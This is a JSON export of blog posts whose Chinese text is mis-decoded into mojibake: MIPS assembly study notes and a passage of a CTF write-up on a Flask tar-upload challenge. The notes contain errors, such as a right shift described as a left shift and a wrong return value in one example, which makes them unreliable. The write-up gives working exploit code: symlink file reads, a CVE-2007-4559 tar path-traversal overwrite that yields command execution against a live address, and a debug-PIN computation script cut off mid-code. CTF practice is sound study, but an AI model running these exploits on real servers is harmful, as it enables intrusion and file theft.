[{"title":"è®¡ç»„è¡¥å¤©","url":"/2022/12/16/è®¡ç»„è¡¥å¤©/","content":"# åŸºç¡€\n\n## MIPSæŒ‡ä»¤\n\n| æŒ‡ä»¤                                       | ç¤ºä¾‹              | å«ä¹‰                            | æ³¨é‡Š                                   |\n| ------------------------------------------ | ----------------- | ------------------------------- | -------------------------------------- |\n| åŠ æ³•                                       | add $s1,$s2,$s3   | $s1=$s2+$s3                     |                                        |\n| å‡æ³•                                       | sub $s1,$s2,$s3   | $s1=$s2-$s3                     |                                        |\n| ç«‹å³æ•°åŠ æ³•                                 | addi $s1,$s2,20   | $s1=$s2+20                      | ç«‹å³æ•°å³å¸¸æ•°                           |\n| ä¹˜æ³•                                       | mul $s1,$s2,$s3   | $s1=$s2*$s3                     |                                        |\n| å–å­—                                       | lw $s1,20($s2)    | $s1=Memory[$s2+20]å³a=b[5]      | æ‹¬å·å¤–çš„å­—èŠ‚æ•°åªèƒ½ç”¨å¸¸æ•°ï¼Œç”¨äºå–æ•°ç»„å€¼ |\n| å­˜å­—                                       | sw $s1,20($s2)    | Memory[$s2+20]=$s1å³b[5]=a      | ç”¨äºå¯¹æ•°ç»„èµ‹å€¼                         |\n| å–åŠå­—                                     | lh $s1,20($s2)    | $s1=Memory[$s2+20]              | å–å­—æ˜¯è¯¥åœ°å€åå››ä¸ªå­—èŠ‚ï¼ŒåŠå­—åˆ™ä¸¤ä¸ªå­—èŠ‚ |\n| å–æ— ç¬¦å·åŠå­—                               | lhu $s1,20($s2)   | $s1=Memory[$s2+20]              | é¡¾åæ€ä¹‰ï¼Œæ— ç¬¦å·                       |\n| å­˜åŠå­—                                     | sh $s1,20($s2)    | Memory[$s2+20]=$s1              |                                        |\n| å–å­—èŠ‚                                     | lb $s1,20($s2)    | $s1=Memory[$s2+20]              | å–ä¸€ä¸ªå­—èŠ‚                             |\n| å–æ— ç¬¦å·å­—èŠ‚                               | lbu $s1,20($s2)   | $s1=Memory[$s2+20]              |                                        |\n| å­˜å­—èŠ‚                                     | sb $s1,20($s2)    | Memory[$s2+20]=$s1              |                                        |\n| *å–é“¾æ¥å­—*                                 | *ll $s1,20($s2)*  | *$s1=Memory[$s2+20]*            |                                        |\n| *å­˜æ¡ä»¶å­—*                                 | *sc $s1,20($s2)*  | *Memory[$s2+20]=$s1;$s1=o or 1* |                                        |\n| *å–ç«‹å³æ•°çš„é«˜ä½*                           | *lui $s1,20*      | *$s1=20*2^16*                   |                                        |\n| ä¸                                         | and $s1,$s2,$s3   | $s1=$s2 & $s3                   | æŒ‰ä½ä¸                                 |\n| æˆ–                                         | or $s1,$s2,$s3    | $s1=$s2 \\| $s3                  | æŒ‰ä½æˆ–                                 |\n| æˆ–é                                       | nor $s1,$s2,$s3   | $s1=~($s2 \\| $s3)               | æŒ‰ä½æˆ–é                               |\n| å¼‚æˆ–                                       | xor $s1,$s2,$s3   | å¼‚æˆ–                            | å¼‚æˆ–                                   |\n| ç«‹å³æ•°ä¸                                   | andi $s1,$s2,20   | $s1=$s2 & 20                    |                                        |\n| ç«‹å³æ•°æˆ–                                   | ori $s1,$s2,20    | $s1=$s2 \\| 20                   |                                        |\n| é€»è¾‘å·¦ç§»                                   | sll $s1,$s2,10    | $s1=$s2<<10                     | å·¦ç§»nä½ç­‰åŒäºä¹˜2^n                     |\n| é€»è¾‘å³ç§»                                   | srl $s1,$s2,10    | $s1=$s2>>10                     | é™¤2^n                                  |\n| ç›¸ç­‰æ—¶è·³è½¬                                 | beq $s1,$s1,Else  | if($s1==$s2) go to Else         | Elseä¸€èˆ¬æ˜¯åé¢å®šä¹‰çš„ä¸€ä¸ªæ ‡ç­¾           |\n| ä¸ç›¸ç­‰æ—¶è·³è½¬                               | bne $s1,$s1,Else  | if($s1!=$s2) go to Else         |                                        |\n| å°äºæ—¶ç½®ä½                                 | slt $s1,$s2,$s3   | if($s2<$s3) $s1=1;else $s1=0    | å‰å°äºååˆ™èµ‹1                          |\n| **æ— ç¬¦å·æ•°**æ¯”è¾ƒå°äºæ—¶ç½®ä½                 | sltu $s1,$s2,$s3  | if($s2<$s3) $s1=1;else $s1=0    | æ— ç¬¦å·æ•°                               |\n| **æ— ç¬¦å·æ•°**æ¯”è¾ƒå°äº**ç«‹å³æ•°**æ—¶ç½®ä½       | slti $s1,$s2,$s3  | if($s2<20) $s1=1;else $s1=0     | æ¯”è¾ƒæ˜¯å¦å°äºå¸¸æ•°                       |\n| **æ— ç¬¦å·æ•°**æ¯”è¾ƒå°äº**æ— ç¬¦å·ç«‹å³æ•°**æ—¶ç½®ä½ | sltiu $s1,$s2,$s3 | if($s2<20) $s1=1;else $s1=0     | æ¯”è¾ƒæ˜¯å¦å°äºæ— ç¬¦å·å¸¸æ•°                 |\n| è·³è½¬                                       | j 2500            | go to 10000                     | å½“ç„¶æ ‡ç­¾ä¹Ÿå¯ä»¥                         |\n| è·³è½¬è‡³å¯„å­˜å™¨æ‰€æŒ‡ä½ç½®                       | jr $ra            | go to $ra                       | ç”¨äºswitchä»¥åŠè¿‡ç¨‹è°ƒç”¨                 |\n| è·³è½¬å¹¶ä¸”é“¾æ¥                               | jal 2500          | $ra=PC+4;go to 10000            | ç”¨äºè¿‡ç¨‹è°ƒç”¨                           |\n\n## 32ä½å¯„å­˜å™¨\n\n| è¡¨ç¤º    | ä½œç”¨                         | æ³¨é‡Š                                            | ä½ç½®       |\n| ------- | ---------------------------- | ----------------------------------------------- | ---------- |\n| $zero   | å¯„å­˜å™¨çš„å€¼æ’ä¸º0              |                                                 | 1          |\n| $v0~$v1 | è®¡ç®—ç»“æœï¼Œè¿”å›å€¼             | ç”¨äºè¿”å›å€¼                                      | 2~3        |\n| $a0~$a3 | ç”¨äºè¿›å…¥å‡½æ•°æ—¶ä¼ é€’å‚æ•°       |                                                 | 4~7        |\n| $s0~$s7 | ä¿ç•™å¯„å­˜å™¨                   | ä¸€èˆ¬å­˜ä¸€äº›é‡è¦çš„å€¼                              | 16~23      |\n| $t0~$t9 | ä¸´æ—¶å¯„å­˜å™¨                   | å…¶å®ƒå‡½æ•°æˆ–å¾ªç¯ç­‰ä¸­çš„ä¸´æ—¶å˜é‡                    | 8~15,24~25 |\n| $at     | æ±‡ç¼–å™¨ä¿ç•™ï¼Œç”¨äºå¤„ç†å¤§çš„å¸¸æ•° |                                                 |            |\n| $sp     | æ ˆæŒ‡é’ˆ                       | è¿›å…¥å…¶å®ƒå‡½æ•°æ—¶                                  | 29         |\n| $ra     | è¿”å›æŒ‡é’ˆ                     | ç”¨äºè¿”å›èµ·å§‹ç‚¹çš„è¿”å›åœ°å€å¯„å­˜å™¨                  | 31         |\n| $gp     | å…¨å±€æŒ‡é’ˆ                     | æŒ‡å‘é™æ€æ•°æ®åŒºçš„ä¿ç•™å¯„å­˜å™¨,å…¨å±€å˜é‡æˆ–staticå˜é‡ |            |\n| $fp     | å¸§æŒ‡é’ˆ                       |                                                 |            |\n| $k0~$k1 |                              |                                                 |            |\n\n## æœºå™¨æŒ‡ä»¤\n\n### Rå‹\n\nopä¸functä¸º**å…­ä½**ï¼Œå…¶ä»–**äº”ä½**ï¼ŒåŠ èµ·æ¥æ­£å¥½**ä¸‰åäºŒä½**\n\n| ä¾‹                | op(æ“ä½œç ) | rs(æ“ä½œæ•°å¯„å­˜å™¨) | rt(æ“ä½œæ•°å¯„å­˜å™¨) | rd(ç›®çš„å¯„å­˜å™¨) | shamt(ä½ç§»é‡) | funct(åŠŸèƒ½ç ) |\n| ----------------- | ---------- | ---------------- | ---------------- | -------------- | ------------- | ------------- |\n| add $t0, $s1, $s2 | 0          | 17(**$s1**)      | 18(**$s2**)      | 8(**$t0**)     | 0             | 32            |\n| sub               | 0          | reg              | reg              | reg            | 0             | 34            |\n\n### Iå‹\n\nå› rdå¯„å­˜å™¨åªæœ‰äº”ä½(**<32**)ï¼Œé™åˆ¶å¤ªå¤§ï¼Œæ•…è®¾è®¡**Iå‹**\n\nconstant or addressåŒ…å«rd,shamt,functï¼Œæ‰€ä»¥åå…­ä½\n\n**rtå˜ä¸ºç›®çš„å¯„å­˜å™¨**\n\n| ä¾‹              | op   | rs   | rt   | constant or address |\n| --------------- | ---- | ---- | ---- | ------------------- |\n| addi            | 8    | reg  | reg  | **address**         |\n| lw              | 35   | reg  | reg  | **address**         |\n| sw              | 43   | reg  | reg  | **address**         |\n| lw $t0,300($t1) | 35   | 9    | 8    | 1200(**300 * 4**)   |\n\n**address**è¡¨ç¤ºåå…­ä½åœ°å€\n\n## é€»è¾‘æ“ä½œ\n\n### ç§»ä½(>><<)\n\né€»è¾‘å·¦ç§» (sll)ï¼šå°†ä¸€ä¸ªå­—é‡Œé¢çš„æ‰€æœ‰ä½éƒ½å‘å·¦ç§»åŠ¨ï¼Œå¹¶åœ¨ç©ºå‡ºæ¥çš„ä½ä¸Šå¡«å…… 0ã€‚\n\né€»è¾‘å³ç§» (srl)ï¼šå°†ä¸€ä¸ªå­—é‡Œé¢çš„æ‰€æœ‰ä½éƒ½å‘å·¦ç§»åŠ¨ï¼Œå¹¶åœ¨ç©ºå‡ºæ¥çš„ä½ä¸Šå¡«å…… 0ã€‚\n\nå·¦ç§» ğ‘– ä½å°±ç›¸å½“äºä¹˜ä»¥ 2^ğ‘–ï¼Œå³ç§»å³é™¤\n\n### æŒ‰ä½ä¸(AND)\n\nAND æä¾›äº†ä¸€ç§å°†æºæ“ä½œæ•°ä¸­æŸäº›ä½ç½®ä¸º0 çš„èƒ½åŠ›ï¼Œå‰ææ˜¯å¦ä¸€ä¸ªæ“ä½œæ•°ä¸­å¯¹åº”ä½ä¸º0ã€‚åä¸€ä¸ªæ“ä½œæ•°ä¼ ç»Ÿä¸Šè¢«ç§°ä¸ºæ©ç (mask) ï¼Œå¯“æ„å…¶å¯\"éšè—\"æŸäº›ä½ã€‚\n\nä¸Šä¸‹éƒ½ä¸º **1** åˆ™ç»“æœä¸º **1**\n\n### æŒ‰ä½æˆ–(OR)\n\nä¸Šä¸‹ä»»æ„ä¸€æ•°ä¸º **1** åˆ™ç»“æœä¸º **1**\n\n### æŒ‰ä½å–å(NOT)\n\nå¯¹ä¸€ä¸ªæ•°è¿›è¡Œæ“ä½œï¼Œ1å˜æˆ0ï¼Œ0å˜æˆ1\n\n### æˆ–é(NOT OR)\n\né¡¾åæ€ä¹‰ï¼Œå…ˆ**æˆ–**å†**å–å**\n\n### å¼‚æˆ–(XOR)\n\nç›¸åŒç½®1ï¼Œä¸ç›¸åŒç½®0\n\n## ç¤ºä¾‹\n\n### å¶è¿‡ç¨‹\n\n> C ç¨‹åº\n>\n> ```c\n> int leaf_example (int g, int h, int i, int j)\n> {\n> \tint f;\n> \tf = (g + h) - (i + j);\n> \treturn f;\n> }\n> ```\n>\n> ç¼–è¯‘åçš„MIPS æ±‡ç¼–ä»£ç æ˜¯ä»€ä¹ˆå‘¢?\n>\n> å‚æ•°å˜é‡ g ã€h ã€i å’Œ j å¯¹åº”å‚æ•°å¯„å­˜å™¨ $a0 ã€$a1 ã€$a2 å’Œ$a3ï¼Œf å¯¹åº” $s0\n> å‡å®šéœ€è¦ä¿ç•™$s0,$t0å’Œ$t1è¿™ä¸‰ä¸ªå¯„å­˜å™¨\n\n>  **è§£**\n>\n> ```gas\n> leaf_example:\t#å­ç¨‹åºåï¼Œæ ‡å·\n>     addi $sp,$sp,-12\t#å°†æ ˆæŒ‡é’ˆ$spå‘ä½åœ°å€å‹3ä¸ªå­—ç”¨äºä¿ç•™åŸå¯„å­˜å™¨çš„å€¼\n>     sw $t1, 8($sp)\n>     sw $t0, 4($sp)\n>     sw $s0, 0($sp)\t#ä¿å­˜åŸå€¼\n>     add $t0, $a0, $a1\t# register $t0 contains g+h\n>     add $t1, $a2, $a3\t# register $t1 contains i+j\n>     sub $s0, $t0, $t1 # f = (g + h) - (i + j)\n>     add $v0, $t0, $t1\t# å°†fçš„å€¼å­˜è¿›è¿”å›å€¼å¯„å­˜å™¨$v0ç”¨äºè¿”å›å€¼\n>     lw $s0, 0($sp)\n>     lw $t0, 4($sp)\n>     lw $t1, 8($sp)\t#æ¢å¤åŸå€¼\n>     addi $sp, $sp, 12\t#æ¢å¤æ ˆæŒ‡é’ˆåŸæ¥çš„ä½ç½®\n>     jr $ra\t#æ ¹æ®è·³è½¬å¯„å­˜å™¨ä¸­çš„è¿”å›åœ°å€è·³è½¬\n> ```\n>\n> æ ˆçš„ä½œç”¨å›¾\n>\n> <img src=\"image-20221216203055223.png\">\n\nè¿™ä¸ªè¿‡ç¨‹å¯å«åš**å¶è¿‡ç¨‹**ï¼Œå³ä¸è°ƒç”¨å…¶ä»–è¿‡ç¨‹çš„è¿‡ç¨‹\n\nä¸€èˆ¬æ¥è¯´\n\n| ä¿ç•™           | ä¸ä¿ç•™         |\n| -------------- | -------------- |\n| $s0~$s7        | $t0~$t9        |\n| $sp            | $a0~$a3        |\n| $ra            | $v0~$v1        |\n| æ ˆæŒ‡é’ˆä»¥ä¸Šçš„æ ˆ | æ ˆæŒ‡é’ˆä»¥ä¸‹çš„æ ˆ |\n\n### éå¶è¿‡ç¨‹\n\nå¦‚æœæ˜¯éå¶è¿‡ç¨‹ï¼Œå³è°ƒç”¨è¯¥è¿‡ç¨‹çš„ä¸­é€”ä¹Ÿè¦è°ƒç”¨å…¶ä»–è¿‡ç¨‹ï¼Œå¯èƒ½ä¼šå¯¼è‡´å¯„å­˜å™¨ä½¿ç”¨å†²çª\n\nè§£å†³æ–¹æ³•å°±æ˜¯**å°†æ‰€æœ‰å¿…é¡»ä¿ç•™çš„å¯„å­˜å™¨å‹æ ˆ**\n\n* **è°ƒç”¨è€…**å°†æ‰€æœ‰è°ƒç”¨åè¿˜éœ€è¦çš„å‚æ•°å¯„å­˜å™¨ ($a0 - $a3) æˆ–ä¸´æ—¶å¯„å­˜å™¨ ($t0 - $t9) å‹æ ˆ\n* **è¢«è°ƒç”¨è€…**å°†è¿”å›åœ°å€å¯„å­˜å™¨$raå’Œè¢«è°ƒç”¨è€…ä½¿ç”¨çš„ä¿ç•™å¯„å­˜å™¨( $s0 - $s7) éƒ½å‹æ ˆ\n* **æ ˆæŒ‡é’ˆ$sp**éšç€æ ˆä¸­å¯„å­˜å™¨ä¸ªæ•°è°ƒæ•´ã€‚åˆ°è¿”å›æ—¶ï¼Œå¯„å­˜å™¨ä¼šä»å­˜å‚¨å™¨ä¸­æ¢å¤ï¼Œæ ˆæŒ‡é’ˆä¹Ÿéšç€é‡æ–°è°ƒæ•´ã€‚\n\n#### **é€’å½’è¿‡ç¨‹**\n\né‡å¤è°ƒç”¨å‡½æ•°\n\n> ä¸‹é¢æ˜¯ä¸€ä¸ªè®¡ç®—é˜¶ä¹˜çš„é€’å½’è¿‡ç¨‹:\n>\n> ```c\n> int fact (int n) {\n> \tif(n<1) \n>         return(1);\n> \telse \n>         return ( n * fact(n -1));\n> }\n> ```\n>\n> è¯¥è¿‡ç¨‹çš„MIPS æ±‡ç¼–ä»£ç æ˜¯æ€æ ·çš„å‘¢?\n\n> **è§£**\n>\n> ```assembly\n> fact:\n> \taddi $sp, $sp, -8\t\n> \tsw $ra, 4($sp)\t#æ ¹æ®ä¸Šè¿°å¶è¿‡ç¨‹éœ€ä¿ç•™ $ra\n> \tsw $a0, 0($sp)\t#åŒæ ·ï¼Œå‚æ•°å¯„å­˜å™¨ $a0(<==>n) ä¹Ÿéœ€è¦ä¿ç•™\n> \tslti $t0, $a0, 1\t# $a0 < 1 æ—¶ $t0 ç½® 1\n> \tbeq $t0, $zero, L1\t# if $t0 == 0, go to L1, else(å³$t0 == 1) åˆ™ç»§ç»­\n> \taddi $v0, $zero, 1\t#retutn 1\n> \taddi $sp, $sp, 8\t#å¹¶æœªè¿›å…¥å…¶ä»–è¿‡ç¨‹ï¼Œæ‰€ä»¥ç›´æ¥å¼¹æ ˆè¿”å›å³å¯\n> \tjr $ra\t#return\n> \tL1:\n> \t\taddi $a0, $a0, -1 # gets n - 1\n> \t\tjal fact\t# call fact with (n - 1)\n> \tlw $a0, 0($sp)\t#æ¥ä¸‹æ¥çš„éƒ¨åˆ†å±äº fact\n> \tlw $ra, 4($sp)\n> \taddi $sp, $sp, 8\t#åµŒå¥—äº†å…¶ä»–è¿‡ç¨‹ï¼Œæ‰€ä»¥å…¶ä»–è¿‡ç¨‹è¿›è¡Œå®Œåè¦æ¢å¤åŸå€¼\n> \tmul $v0, $a0, $v0\t#å°†ä¸Šä¸€è¿‡ç¨‹çš„è¿”å›å€¼ä¹˜ n æ¥å¾—åˆ°ç°åœ¨è¿‡ç¨‹çš„è¿”å›å€¼\n> \tjr $ra\t#return\n> ```\n>\n> \n\n#### **è¿­ä»£è¿‡ç¨‹**\n\n**å¾ªç¯æŸä¸€è¿‡ç¨‹**è€Œéå¾ªç¯è¿›å…¥å‡½æ•°\n\n> è€ƒè™‘ä¸‹é¢ä¸€ä¸ªç”¨æ¥æ±‚å’Œçš„è¿‡ç¨‹:\n>\n> ```c\n> int sum (int n, int acc) {\n> \tif (n>0)\n> \t\treturn sum (n â€“ 1, acc + n) ;\n> \telse\n> \t\treturn acc;\n> }\n> ```\n>\n> è¯¥è¿‡ç¨‹çš„MIPS æ±‡ç¼–ä»£ç æ˜¯æ€æ ·çš„å‘¢?\n\n> **è§£**\n>\n> åˆ†æä¸€ä¸‹å¯çŸ¥ï¼Œå¦‚æœ **n>0** åˆ™ä»¤ **n-1** å¹¶ä¸”ä½¿ **acc+n**\n>\n> å®Œå®Œå…¨å…¨å¯ä»¥ç”¨å¾ªç¯ä»£æ›¿\n>\n> **å‡è®¾ $a0 = n  $a1 = acc**\n>\n> ```gas\n> sum:\n> \tslit $t0, $a0, 1\t# $a0 < 1 æ—¶ $t0 ç½® 1\n> \tbne $t0, $zero, sum_exit\t# if $t0 == 0 , go to sum_exit\n> \tadd $a1, $a1, $a0\t# acc = acc + n\n> \taddi $a0, $a0, -1\t# go to sum\n> sum_exit:\n> \tadd $v0, $a1, $zero\t#return acc\n> \tjr $ra\t#return\n> ```\n>\n> \n\n### å­—ç¬¦æ“ä½œ\n\nä¸€ä¸ª **char** ä¸€å­—èŠ‚ï¼Œå…«æ¯”ç‰¹ï¼Œæœ€é«˜è¡¨ç¤º **127**ï¼Œå³**ASCII**ç çš„127ä½\n\næ‰€ä»¥å¯¹å­—ç¬¦ä¸²çš„æ“ä½œä¸€èˆ¬æ˜¯ **lb(å­—èŠ‚è¯»å–) sb(å­—èŠ‚å­˜å‚¨)**\n\n> Cè¯­è¨€\n>\n> ```c\n> void strcpy (char x[], char y[]) {\n>     int i;\n>     i = 0;\n>     while ((x[i] = y[i]) != '\\0')\n>         i += 1;\n> }\n> ```\n>\n> ç¼–è¯‘åçš„MIPSæ±‡ç¼–ä»£ç æ˜¯ä»€ä¹ˆï¼Ÿ\n\n> **è§£**\n>\n> å‡å®šæ•°ç»„ x å’Œ y çš„åŸºåœ°å€åœ¨ $a0 å’Œ $a1 ä¸­ï¼Œè€Œ i åœ¨ $s0 ä¸­\n>\n> strcpy è°ƒæ•´æ ˆæŒ‡é’ˆç„¶åå°†ä¿å­˜çš„å¯„å­˜å™¨ $s0 ä¿å­˜åœ¨æ ˆä¸­\n>\n> ```gas\n> strcpy:\n> \taddi $sp, $sp, -4\n> \tsw $s0, 0($sp)\n> \tadd $s0, $zero, $zero\t# åˆå§‹åŒ– i\n> \tL1:\n> \t\tadd $t1, $s0, $a1\t# get address y[i]\n> \t\tlbu $t2, 0($t1)\t# $t2 = y[i] å¾—åˆ°ç¬¬ i ä¸ªå­—ç¬¦\n> \t\tadd $t3, $s0, $a0\t# get address x[i]\n> \t\tsb $t2, 0($t3)\t# x[i] = y[i]\n> \t\tbeq $t2, $zero, L2 # if y[i] == 0 , go to L2\n> \t\taddi $s0, $s0, 1\t# i = i + 1\n> \t\tj L1\t# ä¸æ˜¯åˆ™ç»§ç»­å¾ªç¯ L1\n> \tL2:\n> \t\tlw $s0, 0($sp)\n> \t\taddi $sp, $sp, 4\n> \t\tjr $ra\t#return\n> ```\n>\n> \n\n\n\n## æ³¨æ„\n\n* ä¸€ä¸ªå­—å››ä¸ªå­—èŠ‚ï¼Œä¸€ä¸ªå­—èŠ‚å…«æ¯”ç‰¹\n* è´Ÿæ•°ä¸€èˆ¬ç”¨è¡¥ç è¡¨ç¤º(**+1å–å**)\n* æ— ç¬¦å·æ•°å³æŠŠç¬¦å·ä½ä¹Ÿå½“æˆä¸€ä½æ•°ï¼Œå¦‚-1çš„æ— ç¬¦å·æ•°ä¸ºä¸º**4294967295**\n* å¦‚æœå‚æ•°å¤šäºå‚æ•°å¯„å­˜å™¨çš„æ•°é‡(**4**)ï¼Œ**MIPS**çº¦å®šå°†é¢å¤–å‚æ•°æ”¾åœ¨**æ ˆæŒ‡é’ˆçš„ä¸Šæ–¹**\n\n### åˆ©ç”¨æ— ç¬¦å·æ•°è¿›è¡Œè¾¹ç•Œæ£€æŸ¥\n\nå¯é™ä½æ£€éªŒä¸‹æ ‡æ˜¯å¦è¶Šç•Œçš„å¼€é”€\n\n```gas\nsltu $t0, $s1, $t2\t# $t0=0 if $s1 >= $t2 or $s1 <0\nbeq $t0, $zero, IndexOutOfBounds\t#if bad , goto Error\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["cs"]},{"title":"ã€‚","url":"/2022/11/27/ã€‚/","content":"# <center>è§è¯å†å²</center>"},{"title":"NSS-6","url":"/2022/11/26/NSS-6/","content":"\n## web\n\n### check(V1)&&check(V2)\n\n```python\n# -*- coding: utf-8 -*-\nfrom flask import Flask,request\nimport tarfile\nimport os\n\napp = Flask(__name__)\napp.config['UPLOAD_FOLDER'] = './uploads'\napp.config['MAX_CONTENT_LENGTH'] = 100 * 1024\nALLOWED_EXTENSIONS = set(['tar'])\n\ndef allowed_file(filename):\n    return '.' in filename and \\\n        filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS\n\n@app.route('/')\ndef index():\n    with open(__file__, 'r') as f:\n        return f.read()\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    if 'file' not in request.files:\n        return '?'\n    file = request.files['file']\n    if file.filename == '':\n        return '?'\n    print(file.filename)\n    if file and allowed_file(file.filename) and '..' not in file.filename and '/' not in file.filename:\n        file_save_path = os.path.join(app.config['UPLOAD_FOLDER'], file.filename)\n        if(os.path.exists(file_save_path)):\n            return 'This file already exists'\n        file.save(file_save_path)\n    else:\n        return 'This file is not a tarfile'\n    try:\n        tar = tarfile.open(file_save_path, \"r\")\n        tar.extractall(app.config['UPLOAD_FOLDER'])\n    except Exception as e:\n        return str(e)\n    os.remove(file_save_path)\n    return 'success'\n\n@app.route('/download', methods=['POST'])\ndef download_file():\n    filename = request.form.get('filename')\n    if filename is None or filename == '':\n        return '?'\n    \n    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)\n    \n    if '..' in filename or '/' in filename:\n        return '?'\n    \n    if not os.path.exists(filepath) or not os.path.isfile(filepath):\n        return '?'\n    \n    with open(filepath, 'r') as f:\n        return f.read()\n    \n@app.route('/clean', methods=['POST'])\ndef clean_file():\n    os.system('/tmp/clean.sh')\n    return 'success'\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', debug=True, port=80)\n```\n\nå¯¹è½¯é“¾æ¥æ²¡æœ‰ä»»ä½•é™åˆ¶ï¼Œç›´æ¥éé¢„æœŸäº†\n\næƒ³ç€flaskç®—pinï¼Œå…ˆçœ‹äº†ä¸‹env\n\n```shell\nln -s /proc/self/environ 1\ntar -zcvf 1.tar 1     #-z ç”¨äºå‹ç¼©è½¯è¿æ¥\nPOSTä¸Šä¼ \n```\n<img src=\"image-20221016221716692.png\">\n\nè®¿é—®å¾—åˆ°flag\n\n### check(Revenge)\n\nä¾¥å¹¸éé¢„æœŸæ‹¿äº†ä¸ªä¸€è¡€ğŸ˜‹\n\n```python\n# -*- coding: utf-8 -*-\nfrom flask import Flask,request\nimport tarfile\nimport os\n\napp = Flask(__name__)\napp.config['UPLOAD_FOLDER'] = './uploads'\napp.config['MAX_CONTENT_LENGTH'] = 100 * 1024\nALLOWED_EXTENSIONS = set(['tar'])\n\ndef allowed_file(filename):\n    return '.' in filename and \\\n        filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS\n\n@app.route('/')\ndef index():\n    with open(__file__, 'r') as f:\n        return f.read()\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    if 'file' not in request.files:\n        return '?'\n    file = request.files['file']\n    if file.filename == '':\n        return '?'\n\n    if file and allowed_file(file.filename) and '..' not in file.filename and '/' not in file.filename:\n        file_save_path = os.path.join(app.config['UPLOAD_FOLDER'], file.filename)\n        if(os.path.exists(file_save_path)):\n            return 'This file already exists'\n        file.save(file_save_path)\n    else:\n        return 'This file is not a tarfile'\n    try:\n        tar = tarfile.open(file_save_path, \"r\")\n        tar.extractall(app.config['UPLOAD_FOLDER'])\n    except Exception as e:\n        return str(e)\n    os.remove(file_save_path)\n    return 'success'\n\n@app.route('/download', methods=['POST'])\ndef download_file():\n    filename = request.form.get('filename')\n    if filename is None or filename == '':\n        return '?'\n    \n    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)\n    \n    if '..' in filename or '/' in filename:\n        return '?'\n    \n    if not os.path.exists(filepath) or not os.path.isfile(filepath):\n        return '?'\n    \n    if os.path.islink(filepath):\n        return '?'\n    \n    if oct(os.stat(filepath).st_mode)[-3:] != '444':\n        return '?'\n    \n    with open(filepath, 'r') as f:\n        return f.read()\n    \n@app.route('/clean', methods=['POST'])\ndef clean_file():\n    os.system('su ctf -c /tmp/clean.sh')\n    return 'success'\n\n# print(os.environ)\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', debug=True, port=80)\n```\n\n`os.path.islink`å¯¹è½¯é“¾æ¥è¿›è¡Œäº†é™åˆ¶ï¼Œæ²¡æ‰¾åˆ°å¯ç»•è¿‡çš„åŠæ³•(å¼€å§‹å¼‚æƒ³å¤©å¼€æƒ³ç€æ„é€ åŒå±‚taræ¥çœ‹æ–‡ä»¶ï¼Œç›´æ¥æŠ¥é”™å˜ï¼Œæ­£å¥½çœ‹åˆ°æ–‡ä»¶å**main.py**ï¼Œ**python 3.10**)\n\nä½†æ˜¯å¯ä»¥åˆ©ç”¨[**CVE-2007-4559**](https://www.trellix.com/en-us/about/newsroom/stories/research/tarfile-exploiting-the-world.html)é€šè¿‡æ–‡ä»¶åä¸­åŒ…å«`../`æ¥è¦†ç›–è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„ä»»ä½•æ–‡ä»¶\n\n#### éé¢„æœŸ\n\nå› ä¸º**flask**åœ¨debugæ¨¡å¼å¼€å¯åä¼š**auto_reload**ï¼Œæ‰€ä»¥å¯åˆ©ç”¨æ­¤ç‰¹æ€§ï¼Œè¦†ç›–**main.py**\n\nåœ¨åŸæ¥çš„åŸºç¡€ä¸ŠåŠ ä¸ªè¿™ä¸ª\n<img src=\"image-20221016223327232.png\">\n\n**exp**\n\n```python\nimport tarfile\nimport requests\n\ndef change_name(tarinfo):\n    tarinfo.name = \"../\" + tarinfo.name\n    return tarinfo\n\nwith tarfile.open(\"exploit.tar\", \"w:xz\") as tar:\n    tar.add(\"main.py\", filter=change_name)\n    \ndef upload():\n    res = requests.post(url=url, files={\"file\": open(\"exploit.tar\", 'rb')})\n    \nurl='http://1.14.71.254:28045/upload'\nupload()\nwhile 1:\n    a=input('bash:')\n    r=requests.post(url=url+'?a='+a)\n    print(r.text)\n```\n<img src=\"image-20221016224003715.png\">\n\n#### é¢„æœŸ\n\né¢„æœŸæ˜¯åˆ©ç”¨è¦†ç›–`/tmp/clean.sh`ï¼Œç„¶åè®¿é—®`/clean` getshell\n\nç„¶åä½ ä¼šå‘ç°flagæ˜¯rootæƒé™æ‰èƒ½è¯»çš„\n\næ‰€ä»¥å°±åªèƒ½**flaskç®—pin**æ¥å¾—åˆ°rootæƒé™äº†\n\nå¸¸ç”¨åå¼¹shellçš„å‘½ä»¤éƒ½æ²¡å¼¹æˆåŠŸï¼Œä¸çŸ¥é“æ€ä¹ˆå›äº‹ï¼Œç›´æ¥rootæƒé™è¯»æ–‡ä»¶å§\n\nç”¨æˆ·ä¸ºè‚¯å®šä¸º**root**äº†\n\n**app.py**çš„ä½ç½®ä¸Šé¢å·²å¾—åˆ°\n<img src=\"image-20221016233634606.png\">\n\nç®—pin(**è¯¦è§ä¸Šç¯‡æ–‡ç« **)\n\n```python\nimport hashlib\nfrom itertools import chain\nprobably_public_bits = [\n    'root'# username\n    'flask.app',# modname\n    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))\n    '/usr/local/lib/python3.10/site-packages/flask/app.py' # getattr(mod, '__file__', None),\n]\n\nprivate_bits = [\n    '2485376925239',# str(uuid.getnode()),  /sys/class/net/ens33/address\n    '96cec10d3d9307792745ec3b85c8962079be847c1c22f74bae99e457863e13fd4c60de47472f2a8d533525466d7c34de'# get_machine_id(), /etc/machine-id\n]\n\nh = hashlib.sha1()\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n            continue\n    if isinstance(bit, str):\n        bit = bit.encode(\"utf-8\")\n    h.update(bit)\nh.update(b\"cookiesalt\")\n\ncookie_name = f\"__wzd{h.hexdigest()[:20]}\"\n\nnum = None\nif num is None:\n    h.update(b\"pinsalt\")\n    num = f\"{int(h.hexdigest(), 16):09d}\"[:9]\n\nrv=None\nif rv is None:\n    for group_size in 5, 4, 3:\n        if len(num) % group_size == 0:\n            rv = \"-\".join(\n                num[x : x + group_size].rjust(group_size, \"0\")\n                for x in range(0, len(num), group_size)\n            )\n            break\n    else:\n        rv = 